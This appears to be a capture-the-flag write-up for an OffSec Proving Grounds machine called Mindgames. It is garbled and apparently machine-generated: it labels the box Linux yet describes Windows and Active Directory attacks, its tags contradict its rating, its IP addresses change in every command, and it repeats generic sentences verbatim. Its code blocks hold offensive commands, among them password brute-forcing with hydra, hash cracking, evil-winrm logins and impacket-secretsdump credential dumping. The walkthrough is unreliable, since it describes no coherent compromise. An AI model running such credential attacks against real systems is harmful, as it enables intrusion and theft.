---
TitleSEO: "OffSec Proving Grounds — Mindgames (Medium Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — Mindgames (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Mindgames. SQL Injection and DCSync to achieve medium compromise on Linux."
Keywords: "offsec, easy, insane"
URL: "https://zurefx.github.io/writeups/htb-mindgames-967.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-967/"
Date: "2024-10-26"
Tags: "OffSec, Easy, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-967"
Permalink: "/writeups/htb-mindgames-967.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Mindgames** is rated **Medium** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.129.124.211`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.118.118.154 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
gobuster dir -u http://10.44.251.105/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.56.210.136 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.95.156.176 -u administrator -p 'P@ssw0rd!'
```

Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
evil-winrm -i 10.91.39.32 -u administrator -p 'P@ssw0rd!'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **NFS No Root Squash**.

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.38.37.231 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.57.3.23/FUZZ
```

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.40.113.197/FUZZ
crackmapexec smb 10.64.234.194 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.19.135.98 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.36.103.129/FUZZ
gobuster dir -u http://10.15.36.203/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.147.52
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `gobuster`
- `sharphound`
- `crackmapexec`
- `smbexec`
- `secretsdump`
- `chisel`
- `hashcat`

### Key Takeaways

- SQL Injection
- DCSync
- NFS No Root Squash
